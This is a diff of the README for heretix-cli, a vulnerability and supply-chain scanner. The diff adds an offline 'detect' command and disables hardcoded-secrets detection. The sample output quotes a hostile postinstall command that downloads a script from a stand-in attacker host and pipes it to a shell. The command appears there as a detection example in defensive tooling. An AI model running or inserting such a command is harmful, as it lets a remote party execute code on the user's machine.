@@ -2,7 +2,7 @@
 
 [日本語版 README](README.ja.md)
 
-A Go CLI tool that scans OS packages (RPM, DPKG) and OSS ecosystems (PyPI, npm/yarn/pnpm) on Linux/Windows servers or Docker container images, then queries a vulnerability API to detect known vulnerabilities. Also performs local supply-chain security checks without any API access: **GlassWorm** (invisible character injection), **Dependency Confusion** (Shai-hulud), **Malicious Install Scripts**, **CI/CD Pipeline Poisoning**, **Hardcoded Secrets**, and **Lock File Integrity** detection.
+A CLI tool that scans OS packages (RPM, DPKG) and OSS ecosystems (PyPI, npm/yarn/pnpm) on Linux/Windows servers or Docker container images, then queries a vulnerability API to detect known vulnerabilities. Also performs local supply-chain security checks without any API access: **GlassWorm** (invisible character injection), **Dependency Confusion** (Shai-hulud), **Malicious Install Scripts**, **CI/CD Pipeline Poisoning**, and **Lock File Integrity** detection.
 
 ## Supported Ecosystems
 
@@ -119,11 +119,35 @@ This command inherits all flags from both `collect` and `check`.
 |---|---|---|
 | `--image` | (none) | Docker image reference to scan |
 | `--dockerfile` | (none) | Dockerfile path: also chain-scans the FROM base image |
-| `--skip-local` | `false` | Skip local security checks (GlassWorm, Dependency Confusion, Malicious Install, CI/CD Poisoning, Hardcoded Secrets, Lock File Integrity) |
+| `--skip-local` | `false` | Skip local security checks (GlassWorm, Dependency Confusion, Malicious Install, CI/CD Poisoning, Lock File Integrity) |
+
+### Local-only Detection (`detect`)
+
+Runs all active local security checks without calling the vulnerability API. Works fully offline.
+
+```bash
+heretix-cli detect
+heretix-cli detect --scan-path /srv/myapp
+heretix-cli detect --format json
+
+# Scan a Docker image
+heretix-cli detect --image nginx:latest
+heretix-cli detect --image myapp:latest --dockerfile ./Dockerfile
+```
+
+| Flag | Default | Description |
+|---|---|---|
+| `--scan-path` | `/` (Linux) / `%SystemDrive%\` (Windows) | Root path for filesystem traversal |
+| `--image` | (none) | Docker image reference to scan |
+| `--dockerfile` | (none) | Dockerfile path: also chain-scans the FROM base image |
+| `--format` | `table` | Output format: `table` / `json` |
+| `--verbose` | `false` | Enable verbose logging |
 
 ## Local Security Checks
 
-In addition to API-based vulnerability detection, `scan` automatically runs six local checks that require no network access:
+The `scan` and `detect` commands run five local checks that require no network access.
+
+When scanning a Docker image (`--image`), OS system directories are automatically skipped across all detectors (`/usr/share`, `/usr/lib/python*`, `/var/cache`, `/proc`, `/sys`, `/dev`, `/boot`, etc.) to avoid scanning millions of irrelevant OS files.
 
 ### GlassWorm Detection
 
@@ -193,6 +217,8 @@ Scans `.github/workflows/*.yml`, `Jenkinsfile`, `.gitlab-ci.yml`, `.circleci/con
 
 ### Hardcoded Secrets Detection
 
+> **Note: temporarily disabled.** The detector logic is implemented but not currently active.
+
 Detects credentials and API keys committed directly in source or configuration files using two complementary techniques:
 
 **Known-format patterns** match well-known token structures and are flagged regardless of context:
@@ -215,7 +241,7 @@ Detects credentials and API keys committed directly in source or configuration f
 
 Placeholder values (`changeme`, `YOUR_KEY_HERE`, `<token>`, environment variable references like `$MY_SECRET`) are automatically excluded. Secret values are redacted to `first6***` in finding output to prevent credential leakage in logs.
 
-Scans `.go`, `.py`, `.js`, `.ts`, `.rb`, `.php`, `.java`, `.cs`, `.sh`, `.env`, `.yaml`, `.yml`, `.toml`, `.json`, `.xml`, `.ini`, `.cfg`, `.conf`, `.properties`, `.tf`. Skips `*.example`, `*.template`, `*_test.go`, `*.spec.ts`, etc.
+Scans `.go`, `.py`, `.js`, `.ts`, `.rb`, `.php`, `.java`, `.cs`, `.sh`, `.bash`, `.env`, `.yaml`, `.yml`, `.toml`, `.json`, `.xml`, `.ini`, `.cfg`, `.conf`, `.properties`, `.tf`. Skips `*.example`, `*.template`, `*_test.go`, `*.spec.ts`, etc. Excludes `target/`, `.next/`, `.nuxt/` in addition to standard dependency directories.
 
 ### Lock File Integrity Detection
 
@@ -270,17 +296,15 @@ D dep-confusion      /app/.npmrc                            -  HIGH      scoped 
 D dep-confusion      /app/requirements.txt                 15  HIGH      --extra-index-url found: pip selects highest version across all indexes
 M malicious-install  /app/package.json                      -  CRITICAL  postinstall: remote code download piped to shell — curl https://evil.example/install.sh | sh
 C cicd-poisoning     /app/.github/workflows/ci.yml         12  HIGH      [github-actions] action pinned to mutable branch ref — uses: actions/checkout@main
-S hardcoded-secrets  /app/config/prod.go                   34  CRITICAL  AWS Access Key ID detected — AKIAIO***
 L lockfile-integrity /app/package-lock.json                 -  HIGH      lodash: integrity uses SHA-1 (broken) — regenerate lockfile with npm ≥ 5 to get SHA-512
 
 G = GlassWorm (invisible/zero-width character injection)
 D = Dependency Confusion (private package resolvable from public registry)
 M = Malicious Install (dangerous command in lifecycle hook)
 C = CI/CD Poisoning (pipeline configuration attack pattern)
-S = Hardcoded Secrets (credential or key committed in source)
 L = Lock File Integrity (weak hash or manifest/lockfile drift)
 
-Local findings: 7 (1 glassworm, 2 dep-confusion, 1 malicious-install, 1 cicd-poisoning, 1 hardcoded-secrets, 1 lockfile-integrity)
+Local findings: 6 (1 glassworm, 2 dep-confusion, 1 malicious-install, 1 cicd-poisoning, 1 lockfile-integrity)
 ```
 
 ### JSON Output (`--format json`)
